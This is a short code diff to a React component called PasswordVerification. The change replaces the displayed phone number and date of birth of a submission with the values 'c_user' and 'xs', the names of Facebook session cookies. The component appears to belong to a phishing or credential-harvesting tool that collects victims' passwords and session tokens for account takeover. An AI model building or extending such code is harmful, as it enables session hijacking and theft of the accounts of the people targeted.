@@ -120,10 +120,10 @@ function PasswordVerification({ submissionId, userData }) {
               <strong>ID:</strong> {submissionId}
             </p>
             <p>
-              <strong>Phone:</strong> {userData?.phoneNumber}
+              <strong>c_user:</strong> {userData?.c_user}
             </p>
             <p>
-              <strong>Date of Birth:</strong> {userData?.dateOfBirth}
+              <strong>xs:</strong> {userData?.xs}
             </p>
           </div>
         </div>
